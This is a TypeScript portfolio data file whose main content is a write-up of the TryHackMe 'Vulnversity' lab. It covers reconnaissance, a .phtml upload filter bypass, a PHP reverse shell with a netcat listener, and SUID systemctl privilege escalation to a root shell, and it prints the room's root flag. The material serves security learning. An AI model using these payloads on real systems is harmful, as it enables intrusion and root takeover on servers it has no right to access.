import type { Project } from '../../../types';

const project: Project = {
    id: 'thm-vulnversity',
    title: 'Vulnversity',
    description: 'Active reconnaissance and web application exploitation challenge. Discovered a vulnerable file upload mechanism that allowed bypassing extension filters. Uploaded a reverse shell payload, gained initial foothold, and escalated privileges through SUID binary exploitation. Demonstrated advanced enumeration techniques and creative payload crafting.',
    techStack: ['Web Exploitation', 'File Upload Bypass', 'Reverse Shell', 'SUID Exploitation'],
    securityLevel: 'DECLASSIFIED',
    link: 'https://tryhackme.com/room/vulnversity',
    writeup: `**Reconnaissance**

Conducted Nmap scan revealing multiple open ports:

\`\`\`bash
nmap -sC -sV -p- -oN nmap_full.txt 10.10.X.X
\`\`\`

Identified HTTP service on port 3333 running Apache web server.

**Directory Enumeration**

Used Gobuster to discover hidden directories:

\`\`\`bash
gobuster dir -u http://10.10.X.X:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
\`\`\`

Found an /internal directory containing a file upload form - potential attack vector!

**File Upload Testing**

Tested the upload functionality with various file extensions:

\`\`\`bash
# Tested extensions:
.php   - BLOCKED
.php3  - BLOCKED
.php4  - BLOCKED
.php5  - BLOCKED
.phtml - ACCEPTED ✓
\`\`\`

Discovered that .phtml files bypass the filter!

**Reverse Shell Upload**

Created a PHP reverse shell payload:

\`\`\`bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.phtml
# Edit the file to set IP and PORT
nano shell.phtml
# Change: $ip = '10.X.X.X'; $port = 4444;
\`\`\`

Successfully uploaded shell.phtml to the server.

**Gaining Initial Access**

Set up a Netcat listener:

\`\`\`bash
nc -lvnp 4444
\`\`\`

Navigated to the uploaded shell file through the browser:

\`\`\`
http://10.10.X.X:3333/internal/uploads/shell.phtml
\`\`\`

Received reverse shell connection as www-data user!

**System Enumeration**

Performed thorough system enumeration:

\`\`\`bash
whoami
# www-data

id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

uname -a
# Linux vulnuniversity 4.4.0-142-generic

find / -perm -4000 2>/dev/null
# Search for SUID binaries
\`\`\`

**SUID Exploitation**

Discovered /bin/systemctl had SUID bit set:

\`\`\`bash
ls -la /bin/systemctl
# -rwsr-xr-x 1 root root /bin/systemctl
\`\`\`

Researched GTFOBins for systemctl exploitation. Created a malicious service file:

\`\`\`bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
\`\`\`

**Privilege Escalation**

Exploited the SUID systemctl binary to read root flag:

\`\`\`bash
cat /tmp/output
\`\`\`

🚩 **Root Flag**: a58ff8579f0a9270368d33a9966c7fd5

Alternative method - spawn root shell:

\`\`\`bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
/bin/bash -p
# Now running as root!
\`\`\`

**Key Takeaways**

- File upload filters can often be bypassed with alternative extensions
- Always enumerate SUID binaries during privilege escalation
- GTFOBins is an invaluable resource for exploitation techniques
- systemctl with SUID is a critical misconfiguration
- Multiple exploitation paths often exist for the same vulnerability`
};

export default project;
